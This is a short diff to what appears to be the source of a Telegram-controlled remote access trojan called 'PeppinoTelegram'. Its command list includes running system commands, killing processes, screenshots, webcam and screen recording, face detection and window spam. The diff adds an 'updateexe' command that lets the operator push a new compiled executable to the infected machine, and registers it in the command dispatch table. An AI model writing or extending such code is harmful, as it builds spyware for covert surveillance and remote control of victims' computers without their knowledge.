@@ -270,6 +270,7 @@ camerawallpaper - Sets webcam's frames as wallpaper.
 setvideowallpaper - Sets a video as wallpaper.
 
 💻 System Control
+updateexe - Waits for you to send a new compiled version.
 execute - Run system command.
 processkiller - Shows a table of processes that you can kill.
 terminateprocess - Kills a process by name.
@@ -1016,6 +1017,7 @@ class PeppinoTelegram:
                 "screenshot":self.screenshot,
                 "messagebox":self.message_box,
                 "waitforface":self.waitforface,
+                "updateexe":self.update_executable,
                 "webcamclip":self.record_webcam,
                 "screenclip":self.record_screen,
                 "messagespam":self.spam_windows,
